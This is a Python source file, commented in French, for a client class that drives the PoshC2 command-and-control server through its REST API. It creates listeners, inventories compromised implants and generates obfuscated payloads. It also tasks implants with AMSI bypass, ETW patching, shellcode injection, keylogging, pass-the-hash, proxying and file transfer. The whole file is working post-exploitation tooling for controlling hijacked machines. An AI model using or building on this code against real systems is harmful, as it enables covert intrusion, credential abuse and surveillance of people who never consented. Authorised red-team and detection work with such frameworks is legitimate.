"""
PoshC2 — REST API Flask (port 4433).

PoshC2 (Nettitude) — framework C2 PowerShell/.NET open-source.
Port C2   : 443/80 (implants check-in)
Port API  : 4433 (management REST Flask)
Auth      : POST /api/authenticate → Bearer token

Endpoints REST :
  POST /api/authenticate              → login → {token}
  GET  /api/implant-handler           → liste handlers (listeners)
  POST /api/implant-handler           → créer un handler
  DELETE /api/implant-handler/{id}    → supprimer un handler
  GET  /api/implant                   → liste des implants
  POST /api/implant/{id}/task         → envoyer une task
  GET  /api/task/{id}                 → résultat d'une task
  POST /api/payload                   → générer un payload
  GET  /api/hosted-file               → fichiers hébergés

Types d'implant : Dropper, Dropper64, PowerShellRunner, Shellcode, PBind, TcpBind
Task types : ShellCmd, PowerShell, Inject, Migrate, BypassAMSI, LoadModule, RunAssembly
"""
from __future__ import annotations

import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class PoshC2C2(RestC2Interface):
    """
    PoshC2 Nettitude — REST API Flask.

    Paramètres extra (config.extra) :
      verify_ssl : bool  (défaut: False)
      api_key    : str   — alternative à username/password
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_hosted_files", "bypass_amsi",
        "powershell_exec", "inject_shellcode", "migrate",
    ]

    # ── Auth ─────────────────────────────────────────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        api_key = config.extra.get("api_key")
        if api_key:
            return api_key

        async with httpx.AsyncClient(
            base_url=config.base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=15.0,
        ) as client:
            resp = await client.post(
                "/api/authenticate",
                json={
                    "username": config.username or "poshc2",
                    "password": config.password or "",
                },
            )
            if resp.status_code not in (200, 201):
                raise C2AuthError(
                    f"PoshC2 auth échouée [{resp.status_code}]: {resp.text[:200]}"
                )
            data  = resp.json()
            token = data.get("token") or data.get("access_token")
            if not token:
                raise C2AuthError(f"Token PoshC2 absent : {data}")
            logger.info("PoshC2 : authentifié")
            return token

    async def get_status(self) -> C2Status:
        if not self._client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._client.get("/api/implant", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Listeners (C2 handlers) ───────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "http").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 443))
        name     = config.get("name", f"posh-{protocol}-{port}")

        implant_type_map = {
            "http":  "Dropper",
            "https": "Dropper64",
            "ps1":   "PowerShellRunner",
            "smb":   "PBind",
            "tcp":   "TcpBind",
        }
        implant_type = config.get("implant_type", implant_type_map.get(protocol, "Dropper"))

        body = {
            "name":              name,
            "kill_date":         config.get("kill_date", ""),
            "implant_type":      implant_type,
            "listen_address":    host,
            "listen_port":       port,
            "connect_address":   config.get("callback_host", host),
            "connect_port":      port,
            "use_ssl":           protocol == "https",
            "jitter_percentage": config.get("jitter", 20),
            "beacon_time":       config.get("sleep", 60),
            "user_agent":        config.get("user_agent", "Mozilla/5.0"),
        }

        data = await self._post("/api/implant-handler", json=body)
        hid  = str(data.get("id") or data.get("handler_id") or uuid.uuid4())

        return Listener(
            id=hid,
            name=data.get("name", name),
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=protocol,
            status="running" if data.get("active", True) else "stopped",
            meta={"implant_type": implant_type},
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._delete(f"/api/implant-handler/{listener_id}")
            return True
        except Exception as exc:
            logger.error("PoshC2 remove_listener : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data  = await self._get("/api/implant-handler")
        items = data if isinstance(data, list) else data.get("handlers", [])
        return [
            Listener(
                id=str(h.get("id") or h.get("handler_id") or uuid.uuid4()),
                name=h.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=h.get("listen_address", "0.0.0.0"),
                bind_port=int(h.get("listen_port", 443)),
                protocol="https" if h.get("use_ssl") else "http",
                status="running" if h.get("active", True) else "stopped",
                meta={"implant_type": h.get("implant_type", "Dropper")},
            )
            for h in items
        ]

    # ── Implants ──────────────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data  = await self._get("/api/implant")
        items = data if isinstance(data, list) else data.get("implants", [])
        return [self._parse_implant(i) for i in items]

    def _parse_implant(self, i: dict[str, Any]) -> Implant:
        iid = str(i.get("id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S",
                            "%Y-%m-%d %H:%M:%S", "%d/%m/%Y %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        integrity_raw = str(i.get("integrity_level") or i.get("integrity", "")).lower()
        if "system" in integrity_raw:
            integrity = "SYSTEM"
        elif "admin" in integrity_raw or "high" in integrity_raw:
            integrity = "ADMIN"
        else:
            integrity = "USER"

        return Implant(
            id=iid,
            name=i.get("hostname") or i.get("name") or iid,
            c2_type=self._config.c2_type,
            listener_id=str(i.get("handler_id") or i.get("listener_id", "")),
            external_ip=i.get("external_ip") or i.get("ip_address", ""),
            internal_ip=i.get("internal_ip") or i.get("ip", ""),
            hostname=i.get("hostname", ""),
            username=i.get("username") or i.get("user", ""),
            os=i.get("os") or i.get("operating_system", ""),
            arch=i.get("architecture") or i.get("arch", ""),
            pid=int(i.get("pid") or i.get("process_id", 0)),
            process_name=i.get("process_name") or i.get("process", ""),
            integrity=integrity,
            last_checkin=_dt(i.get("last_seen") or i.get("checkin_time")),
            first_seen=_dt(i.get("first_seen") or i.get("creation_time")),
            active=not bool(i.get("killed", False)),
            meta={
                "implant_type": i.get("implant_type", "Dropper"),
                "beacon_time":  i.get("beacon_time", 60),
                "jitter":       i.get("jitter_percentage", 20),
            },
        )

    # ── Tasks ─────────────────────────────────────────────────────────────────

    _TASK_TYPES: dict[str, str] = {
        "shell":      "ShellCmd",
        "cmd":        "ShellCmd",
        "ps":         "PowerShell",
        "powershell": "PowerShell",
        "inject":     "Inject",
        "migrate":    "Migrate",
        "amsi":       "BypassAMSI",
        "etw":        "PatchETW",
        "upload":     "Upload",
        "download":   "Download",
        "ls":         "ListDirectory",
        "cd":         "ChangeDirectory",
        "pwd":        "GetCurrentDirectory",
        "cat":        "ReadFile",
        "ps_list":    "GetProcesses",
        "whoami":     "GetCurrentUser",
        "sysinfo":    "GetSystemInfo",
        "screenshot": "Screenshot",
        "keylog":     "Keylog",
        "module":     "LoadModule",
        "assembly":   "RunAssembly",
        "rev2self":   "Rev2Self",
        "token":      "MakeToken",
        "pth":        "PassTheHash",
        "sleep":      "ModifySleep",
        "exit":       "Kill",
        "socks":      "CreateProxy",
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "shell"
        task_type = self._TASK_TYPES.get(cmd_lower, "ShellCmd")
        extra     = cmd_parts[1:] + args_list

        params: dict[str, Any]
        if task_type in ("ShellCmd", "PowerShell"):
            params = {"command": " ".join(extra) if extra else command}
        elif task_type == "Inject":
            params = {"shellcode": extra[0] if extra else "", "pid": int(extra[1]) if len(extra) > 1 and extra[1].isdigit() else 0}
        elif task_type == "ModifySleep":
            params = {"sleep": int(extra[0]) if extra else 60, "jitter": int(extra[1]) if len(extra) > 1 else 20}
        elif task_type in ("Upload", "Download"):
            params = {"source": extra[0] if extra else "", "destination": extra[1] if len(extra) > 1 else ""}
        elif task_type == "RunAssembly":
            params = {"assembly": extra[0] if extra else "", "arguments": extra[1:], "bypass_amsi": True}
        else:
            params = {"arguments": extra}

        data = await self._post(f"/api/implant/{agent_id}/task", json={
            "implant_id": agent_id, "task_type": task_type, "parameters": params
        })
        return Task(
            id=str(data.get("id") or data.get("task_id") or uuid.uuid4()),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=data.get("status", "queued"),
            meta={"task_type": task_type},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        data = await self._get(f"/api/task/{task_id}")
        return {
            "task_id": task_id,
            "status":  data.get("status"),
            "output":  data.get("output") or data.get("result", ""),
        }

    # ── Payload ───────────────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        fmt_map = {
            "exe": "Dropper64", "ps1": "PowerShellRunner",
            "shellcode": "Shellcode", "dll": "Dropper",
        }
        body = {
            "handler_id":        config.listener_id,
            "implant_type":      config.extra.get("implant_type", fmt_map.get(config.format, "Dropper64")),
            "arch":              config.arch,
            "beacon_time":       config.sleep,
            "jitter_percentage": config.jitter,
            "obfuscate":         config.obfuscation,
        }
        data    = await self._post("/api/payload", json=body)
        file_id = data.get("file_id") or data.get("id")
        if file_id:
            resp = await self._client.get(f"/api/payload/{file_id}/download")
            return resp.content if resp.status_code == 200 else b""
        import base64
        b64 = data.get("data") or data.get("payload", "")
        return base64.b64decode(b64) if b64 else b""

    async def list_hosted_files(self) -> list[dict[str, Any]]:
        self._require_connected()
        data  = await self._get("/api/hosted-file")
        items = data if isinstance(data, list) else data.get("files", [])
        return [{"id": str(f.get("id")), "url": f.get("url", ""), "filename": f.get("filename", "")} for f in items]

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
